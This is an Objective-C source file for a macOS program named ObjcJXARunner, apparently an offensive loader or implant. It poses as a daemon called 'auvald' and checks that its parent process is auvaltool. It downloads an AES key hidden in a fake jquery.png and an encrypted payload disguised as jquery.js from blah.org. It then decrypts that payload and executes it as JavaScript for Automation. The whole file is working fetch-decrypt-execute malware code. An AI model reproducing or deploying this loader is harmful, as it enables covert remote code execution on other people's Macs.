//
//  main.m
//  ObjcJXARunner
//
//  Created by david on 2/2/23.
//

#import <Foundation/Foundation.h>
#import <OSAKit/OSAKit.h>
#import "aes.h"
#import <libproc.h>
#import <unistd.h>

NSData *AESEncryptData(NSData *data, NSData *key);
NSData *AESDecryptData(NSData *encryptedData, NSData *key);
NSData *makeHTTPRequestAsBytes(NSString *urlString);
void runJXA(NSString *payload) {
    OSALanguage *lang = [OSALanguage languageForName:@"JavaScript"];
    OSAScript *script = [[OSAScript alloc] initWithSource:payload language:lang];
    NSError *error = nil;
    BOOL success = [script compileAndReturnError:&error];
    if (success) {
        NSAppleEventDescriptor *result = [script executeAndReturnError:&error];
    }
    if (error) {
        NSLog(@"JXA error: %@", error.localizedDescription);
    }
}

bool contextCheck() {
    int parentProcessId = getppid();
    char pathBuffer[PROC_PIDPATHINFO_MAXSIZE];
    if (proc_pidpath(parentProcessId, pathBuffer, sizeof(pathBuffer)) <= 0) {
        NSLog(@"Failed to get process name");
    } else {
        NSString *ppidName = [[NSString stringWithUTF8String:pathBuffer] lastPathComponent];
        NSLog(@"%@", ppidName);
        NSString *expectedParent = @"auvaltool";
        if ([ppidName isEqualToString:expectedParent]) {
            return true;
        } else {
            return false;
        }
    }
    return false;
}

NSString *pidFile = @"auvald.pid";

void writePIDFile() {
    NSString *pidDirectory = @".pid";
    NSString *homeDir = NSHomeDirectory();
    NSString *pidDirectoryPath = [homeDir stringByAppendingPathComponent:pidDirectory];

    NSError *error;
    if (![[NSFileManager defaultManager] createDirectoryAtPath:pidDirectoryPath withIntermediateDirectories:YES attributes:nil error:&error]) {
        NSLog(@"Failed to create .pid directory");
    }
    
    NSString *pid = [NSString stringWithFormat:@"%d", (int)getpid()];
    NSString *pidFilePath = [pidDirectoryPath stringByAppendingPathComponent:pidFile];
    if (![pid writeToFile:pidFilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
        NSLog(@"Failed to write PID file");
    }
}

BOOL checkPIDFile() {
    if ([[NSFileManager defaultManager] fileExistsAtPath:pidFile]) {
        NSError *error;
        NSString *pid = [NSString stringWithContentsOfFile:pidFile encoding:NSUTF8StringEncoding error:&error];
        if (pid) {
            int32_t existingPID = [pid intValue];
            if (existingPID == getpid()) {
                return YES;
            }
        } else {
            NSLog(@"Failed to read PID file");
        }
    }
    return NO;
}


int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"auvald init");
        if (contextCheck()==false) {
            NSLog(@"incorrect context");
            //return 1;
        }
        if (checkPIDFile()) {
            NSLog(@"Daemon is already running");
        } else {
            writePIDFile();
            // Start the daemon
        }
        
        NSString *keyURL = @"https://blah.org/js/jquery.png";
        NSData *keyData = makeHTTPRequestAsBytes(keyURL);
        if (keyData) {
          NSLog(@"Data received: %@", keyData);
        } else {
          NSLog(@"Request failed");
            return 0;
        }
        
        if (keyData == nil) {
            return 0;
        }
        
        //parse IV and key from offsets in binary response
        NSRange range = NSMakeRange(30, 16);
        NSData *iv = [keyData subdataWithRange:range];
        range = NSMakeRange(46, 32);
        NSData *key = [keyData subdataWithRange:range];
        

        // fetch encrypted blob
        NSString *payloadURL = @"https://blah.org/js/jquery.js";
        NSString *responseText = @"";
        NSData *response = makeHTTPRequestAsBytes(payloadURL);
        if (response) {
            responseText = [[NSString alloc] initWithData:response encoding:NSUTF8StringEncoding];
        } else {
            NSLog(@"Fetch error");
            return 2;
        }
        NSData *payload = [NSData data];
        NSArray *lines = [responseText componentsSeparatedByString:@"\n"];
        if (lines.count >= 3) {
            NSString *lastItem = lines[3];
            NSArray *words = [lastItem componentsSeparatedByString:@" "];
            if (words.count == 2) {
                NSString *r = [words[1] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
                payload = [[NSData alloc] initWithBase64EncodedString:r options:0];
                NSLog(@"Retrieved bytes: %lu", (unsigned long)payload.length);
            }
        } else {
            NSLog(@"Array does not contain enough items");
            return 3;
        }
      
        //decrypt data
        AES *aes = [[AES alloc] initWithKey:key iv:iv]; // assume key and iv are arrays of bytes with correct length
        NSData *decryptedData = [aes decryptData:payload];
        //NSString *calc = @"var calc = Application('Calculator');calc.activate();";
        //runJXA(calc);
        if (decryptedData) {
            NSString *decryptedString = [[NSString alloc] initWithData:decryptedData encoding:NSUTF8StringEncoding];
            runJXA(decryptedString);
        
        } else {
            NSLog(@"Error: Failed to decrypt data.");
        }
        return 0;
    }
}
